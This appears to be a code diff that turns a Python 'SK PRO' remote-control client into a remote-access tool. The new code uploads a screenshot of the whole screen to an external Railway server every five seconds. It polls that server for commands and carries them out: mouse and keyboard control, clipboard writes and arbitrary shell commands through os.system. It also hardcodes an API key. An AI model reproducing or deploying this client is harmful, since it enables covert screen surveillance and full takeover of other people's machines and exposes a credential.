@@ -1,221 +1,240 @@
-#!/usr/bin/env python3
 """
-ProjectSender Client - FIXED VERSION
-- Proper heartbeat to server
-- Real-time user online tracking
-- Control command receiver
-- Auto offline on disconnect
+SK PRO - CLIENT RECEIVER
+Heartbeat + Screenshot + Remote Control
 """
 
-import os
-import sys
 import time
-import json
-import requests
 import threading
-from datetime import datetime
-import platform
+import base64
+import json
+import os
+from io import BytesIO
+from PIL import ImageGrab
+import requests
+import pyautogui
+import pyperclip
 
-# ═══════════════════════════════════════════════════════════════════
-# 🔧 API CONFIGURATION
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
+# CONFIG (Injected from Build EXE)
+# ════════════════════════════════════════════════════════════════════
 
-API_URL = "https://sender-production-32bc.up.railway.app"
-API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"
+SERVER_URL = os.getenv("SERVER_URL", "https://sender-production-32bc.up.railway.app")
+USER_API_KEY = os.getenv("USER_API_KEY", "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV")
+USERNAME = os.getenv("USERNAME", "client_user")
+HEARTBEAT_INTERVAL = 30  # Every 30 seconds
+SCREENSHOT_INTERVAL = 5  # Every 5 seconds
 
-# Get client name from arg or env
-CLIENT_NAME = os.getenv("CLIENT_NAME", "SK_PRO_Client")
-HEARTBEAT_INTERVAL = 5  # Send heartbeat every 5 seconds
+# ════════════════════════════════════════════════════════════════════
+# HEADERS
+# ════════════════════════════════════════════════════════════════════
 
-# ═══════════════════════════════════════════════════════════════════
-# 🎮 CONTROL COMMAND HANDLER
-# ═══════════════════════════════════════════════════════════════════
+HEADERS = {"x-api-key": USER_API_KEY}
 
-class ControlCommandHandler:
-    """Handle remote control commands from admin"""
-    
-    @staticmethod
-    def execute(cmd):
-        """Execute control command"""
-        try:
-            cmd_type = cmd.get("type")
-            data = cmd.get("data", {})
-            
-            print(f"[CLIENT] CONTROL: {cmd_type} {data}")
-            
-            if cmd_type == "ping_control":
-                print("[CLIENT] ✓ PING received")
-            
-            elif cmd_type == "mouse_move":
-                x = int(data.get("x", 0))
-                y = int(data.get("y", 0))
-                try:
-                    import pyautogui
-                    pyautogui.moveTo(x, y)
-                    print(f"[CLIENT] ✓ Mouse moved to ({x}, {y})")
-                except Exception as e:
-                    print(f"[CLIENT] ✗ Mouse move error: {e}")
-            
-            elif cmd_type == "mouse_click":
-                x = int(data.get("x", 0))
-                y = int(data.get("y", 0))
-                button = data.get("button", "left")
-                try:
-                    import pyautogui
-                    pyautogui.click(x, y, button=button)
-                    print(f"[CLIENT] ✓ Mouse click ({button}) at ({x}, {y})")
-                except Exception as e:
-                    print(f"[CLIENT] ✗ Mouse click error: {e}")
-            
-            elif cmd_type == "double_click":
-                x = int(data.get("x", 0))
-                y = int(data.get("y", 0))
-                try:
-                    import pyautogui
-                    pyautogui.doubleClick(x, y)
-                    print(f"[CLIENT] ✓ Double click at ({x}, {y})")
-                except Exception as e:
-                    print(f"[CLIENT] ✗ Double click error: {e}")
-            
-            elif cmd_type == "key_press":
-                key = data.get("key", "")
-                try:
-                    import pyautogui
-                    pyautogui.press(key)
-                    print(f"[CLIENT] ✓ Key pressed: {key}")
-                except Exception as e:
-                    print(f"[CLIENT] ✗ Key press error: {e}")
-            
-            elif cmd_type == "hotkey":
-                keys = data.get("keys", [])
-                try:
-                    import pyautogui
-                    if len(keys) >= 2:
-                        pyautogui.hotkey(*keys)
-                        print(f"[CLIENT] ✓ Hotkey: {'+'.join(keys)}")
-                except Exception as e:
-                    print(f"[CLIENT] ✗ Hotkey error: {e}")
-            
-            else:
-                print(f"[CLIENT] ⚠ Unknown command: {cmd_type}")
-            
-            return {"status": "ok"}
-        
-        except Exception as e:
-            print(f"[CLIENT] ✗ Handler error: {e}")
-            return {"status": "error"}
-
-# ═══════════════════════════════════════════════════════════════════
-# 💓 HEARTBEAT - Keep user ONLINE
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
+# HEARTBEAT - Keep client online
+# ════════════════════════════════════════════════════════════════════
 
 def send_heartbeat():
-    """Send heartbeat to server to keep user ONLINE"""
-    headers = {"x-api-key": API_KEY}
-    
+    """Send heartbeat to keep client online"""
     while True:
         try:
-            # Get system info
-            os_info = platform.system() + " " + platform.release()
+            payload = {
+                "username": USERNAME,
+                "timestamp": time.time(),
+                "status": "online"
+            }
             
-            # Send heartbeat
             resp = requests.post(
-                f"{API_URL}/heartbeat",
-                headers=headers,
-                json={
-                    "username": CLIENT_NAME,
-                    "os_info": os_info,
-                    "current_status": "online"
-                },
+                f"{SERVER_URL}/api/user/heartbeat",
+                json=payload,
+                headers=HEADERS,
                 timeout=5
             )
             
             if resp.status_code == 200:
-                data = resp.json()
-                
-                # Check if disconnect requested
-                if data.get("disconnect_requested"):
-                    print("[CLIENT] ⚠ DISCONNECT REQUESTED BY ADMIN")
-                    sys.exit(0)
-                
-                # Check expiry
-                if data.get("expires_at"):
-                    print(f"[CLIENT] ✓ Heartbeat OK, expires at: {data.get('expires_at')}")
-            
-            time.sleep(HEARTBEAT_INTERVAL)
+                print(f"✅ Heartbeat sent - Client ONLINE")
+            else:
+                print(f"❌ Heartbeat failed: {resp.status_code}")
         
         except Exception as e:
-            print(f"[CLIENT] ✗ Heartbeat error: {e}")
-            time.sleep(HEARTBEAT_INTERVAL)
+            print(f"❌ Heartbeat error: {str(e)[:50]}")
+        
+        time.sleep(HEARTBEAT_INTERVAL)
 
-# ═══════════════════════════════════════════════════════════════════
-# 🎮 CONTROL POLLING - Receive commands
-# ═══════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════
+# SCREENSHOT - Capture and upload
+# ════════════════════════════════════════════════════════════════════
 
-def poll_control_commands():
-    """Poll for control commands from admin"""
-    headers = {"x-api-key": API_KEY}
-    
+def take_screenshot_base64():
+    """Capture screenshot and convert to base64"""
+    try:
+        screenshot = ImageGrab.grab()
+        buffer = BytesIO()
+        screenshot.save(buffer, format="PNG")
+        img_base64 = base64.b64encode(buffer.getvalue()).decode()
+        return img_base64
+    except Exception as e:
+        print(f"❌ Screenshot error: {str(e)[:50]}")
+        return None
+
+def send_screenshot():
+    """Send screenshot to server"""
     while True:
         try:
-            # Poll for commands
+            img_base64 = take_screenshot_base64()
+            
+            if img_base64:
+                payload = {
+                    "username": USERNAME,
+                    "image_base64": img_base64,
+                    "timestamp": time.time()
+                }
+                
+                resp = requests.post(
+                    f"{SERVER_URL}/api/user/screenshot",
+                    json=payload,
+                    headers=HEADERS,
+                    timeout=10
+                )
+                
+                if resp.status_code == 200:
+                    print(f"✅ Screenshot uploaded")
+                else:
+                    print(f"❌ Screenshot upload failed: {resp.status_code}")
+        
+        except Exception as e:
+            print(f"❌ Screenshot error: {str(e)[:50]}")
+        
+        time.sleep(SCREENSHOT_INTERVAL)
+
+# ════════════════════════════════════════════════════════════════════
+# COMMANDS - Check and execute
+# ════════════════════════════════════════════════════════════════════
+
+def check_commands():
+    """Check for pending commands from admin"""
+    while True:
+        try:
             resp = requests.get(
-                f"{API_URL}/control/poll/{CLIENT_NAME}",
-                headers=headers,
+                f"{SERVER_URL}/api/user/commands?username={USERNAME}",
+                headers=HEADERS,
                 timeout=5
             )
             
             if resp.status_code == 200:
                 data = resp.json()
-                events = data.get("events", [])
+                commands = data.get("commands", [])
                 
-                if events:
-                    print(f"[CLIENT] 📨 Received {len(events)} commands")
-                    for evt in events:
-                        ControlCommandHandler.execute(evt)
-            
-            time.sleep(0.5)
+                for cmd in commands:
+                    execute_command(cmd)
         
         except Exception as e:
-            print(f"[CLIENT] ✗ Poll error: {e}")
-            time.sleep(1)
+            print(f"❌ Command check error: {str(e)[:50]}")
+        
+        time.sleep(10)
 
-# ═══════════════════════════════════════════════════════════════════
-# 🚀 MAIN
-# ═══════════════════════════════════════════════════════════════════
+def execute_command(cmd):
+    """Execute command from admin"""
+    cmd_id = cmd["id"]
+    command = cmd["command"]
+    args = cmd.get("args", "")
+    
+    try:
+        if command == "mouse":
+            # Format: x,y,action
+            parts = args.split(",")
+            if len(parts) >= 3:
+                x, y, action = int(parts[0]), int(parts[1]), parts[2]
+                
+                if action == "move":
+                    pyautogui.moveTo(x, y)
+                elif action == "click":
+                    pyautogui.click(x, y)
+                elif action == "drag":
+                    pyautogui.moveTo(x, y)
+                    pyautogui.drag(100, 100)
+                
+                print(f"✅ Mouse command executed: {action} at ({x}, {y})")
+        
+        elif command == "keyboard":
+            # Format: key,action
+            parts = args.split(",")
+            if len(parts) >= 2:
+                key = parts[0]
+                action = parts[1]
+                
+                if action == "press":
+                    pyautogui.press(key)
+                elif action == "hold":
+                    pyautogui.keyDown(key)
+                elif action == "release":
+                    pyautogui.keyUp(key)
+                
+                print(f"✅ Keyboard command executed: {action} key {key}")
+        
+        elif command == "clipboard":
+            # Set clipboard
+            pyperclip.copy(args)
+            print(f"✅ Clipboard set")
+        
+        elif command == "execute":
+            # Execute shell command
+            os.system(args)
+            print(f"✅ Command executed: {args}")
+        
+        # Acknowledge command
+        ack_command(cmd_id)
+    
+    except Exception as e:
+        print(f"❌ Command execution error: {str(e)[:50]}")
+
+def ack_command(cmd_id):
+    """Acknowledge command execution"""
+    try:
+        resp = requests.post(
+            f"{SERVER_URL}/api/user/command-ack?cmd_id={cmd_id}",
+            headers=HEADERS,
+            timeout=5
+        )
+        if resp.status_code == 200:
+            print(f"✅ Command {cmd_id} acknowledged")
+    except Exception as e:
+        print(f"❌ ACK error: {str(e)[:50]}")
+
+# ════════════════════════════════════════════════════════════════════
+# MAIN - Start all threads
+# ════════════════════════════════════════════════════════════════════
 
 def main():
-    """Main client loop"""
-    print("╔════════════════════════════════════════════════════════════╗")
-    print("║     SK PRO Client - FIXED VERSION                          ║")
-    print("╚════════════════════════════════════════════════════════════╝")
-    print(f"[CLIENT] Name: {CLIENT_NAME}")
-    print(f"[CLIENT] API: {API_URL}")
-    print(f"[CLIENT] Heartbeat every {HEARTBEAT_INTERVAL} seconds")
-    print()
+    """Start client receiver"""
+    print(f"""
+╔════════════════════════════════════════════════════════════════════════════╗
+║                  SK PRO CLIENT RECEIVER v4.2                              ║
+║                   🟢 ONLINE - Ready for Remote Control                    ║
+╚════════════════════════════════════════════════════════════════════════════╝
+
+Server: {SERVER_URL}
+User: {USERNAME}
+Status: RUNNING
+
+Threads:
+├─ Heartbeat: Every {HEARTBEAT_INTERVAL}s (Keep Online)
+├─ Screenshot: Every {SCREENSHOT_INTERVAL}s (Live View)
+└─ Commands: Every 10s (Remote Control)
+    """)
     
-    # Start heartbeat thread
-    hb_thread = threading.Thread(target=send_heartbeat, daemon=True)
-    hb_thread.start()
-    print("[CLIENT] ✓ Heartbeat thread started")
+    # Start daemon threads
+    threading.Thread(target=send_heartbeat, daemon=True).start()
+    threading.Thread(target=send_screenshot, daemon=True).start()
+    threading.Thread(target=check_commands, daemon=True).start()
     
-    # Start control polling thread
-    ctrl_thread = threading.Thread(target=poll_control_commands, daemon=True)
-    ctrl_thread.start()
-    print("[CLIENT] ✓ Control polling thread started")
-    
-    print()
-    print("[CLIENT] ✓ Client ONLINE and ready for commands")
-    print("[CLIENT] Press Ctrl+C to exit")
-    print()
-    
-    # Keep running
+    # Keep main thread alive
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\n[CLIENT] ⚠ Shutting down...")
-        sys.exit(0)
+        print("\n❌ Client stopped")
 
 if __name__ == "__main__":
     main()
+
